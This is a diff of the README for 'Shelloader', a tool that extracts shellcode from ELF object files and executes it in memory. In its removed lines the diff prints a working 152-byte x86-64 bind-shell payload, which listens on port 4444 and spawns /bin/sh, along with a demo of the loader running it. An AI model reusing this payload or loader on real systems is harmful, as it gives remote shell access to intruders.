@@ -1,23 +1,20 @@
 Shelloader
 ===========
 
-Linux 64-Bit mmap based shellcode loader.
+Linux 64-Bit mmap based shellcode loader. Will read ELF object files and parse out the shellcode. It also
+has the ability to execute the shellcode.
 
-Video showing it being used
----------------------------
+### Video showing an earlier demonstration
 
 <a href="http://www.youtube.com/watch?v=SNp7Tltc1wM">http://www.youtube.com/watch?v=SNp7Tltc1wM</a>
 
-Example usage with remoteshell shellcode
------------------------------------------
+Build
+-----
+    $ make
+    $ sudo make install
 
-[rj@localhost  shelloader]$ ./shelloader remoteshell_nulled.o -e<br>
-Linux 64-Bit mmap based shellcode loader by Travis "rjkall".<br>
-[*] Examining remoteshell_nulled.o...<br>
-[*] EI_MAG0 = 0x7f, continuing.<br>
-[*] Found .text section at address 0x00000040 with length of 152 bytes.<br>
-[*] Dumping shellcode.<br>
-\x55\x48\x89\xe5\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc1\x48\x83\xec\x10\x66\xc7\x45\xf2\x11\x5c\xbe\x80\xff\xff\xfe\xf7\xd6\x89\x75\xf4\xc6\x45\xf0\x02\x4c\x89\xcf\x48\x8d\x75\xf0\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x4c\x89\xcf\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x83\xec\x10\x4c\x89\xcf\x48\x8d\x75\xf0\x6a\x10\x54\x5a\x6a\x2b\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x48\x83\xfe\x03\x7d\x0d\x4c\x89\xc7\x6a\x21\x58\x0f\x05\x48\xff\xc6\xeb\xed\x48\xb8\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe8\x08\x50\x54\x5f\x48\x31\xf6\x48\x31\xd2\x6a\x3b\x58\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05<br>
-[*] Mapping and copying 152 bytes of shellcode to memory.<br>
-[*] Executing shellcode at address 0x7fcc522c6000.<br>
-[rj@localhost shelloader]$ <br>
+Author
+-------
+    Travis Montoya a.k.a "rjkall" <rjtravis (-AT) hushmail (-DOT) com
+    http://www.twitter.com/travismon
+
